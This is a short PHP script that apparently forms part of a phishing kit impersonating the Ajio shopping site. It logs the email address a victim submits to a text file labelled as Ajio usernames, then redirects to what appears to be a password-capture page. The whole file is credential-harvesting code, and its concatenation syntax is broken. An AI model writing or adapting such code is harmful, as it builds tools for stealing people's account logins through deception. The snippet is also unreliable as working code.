<?php
file_put_contents("usernames.txt", "Ajio Username: "  $_POST["email"] . "\n", FILE_APPEND);
header("Location: pass.html.php");
exit();
?>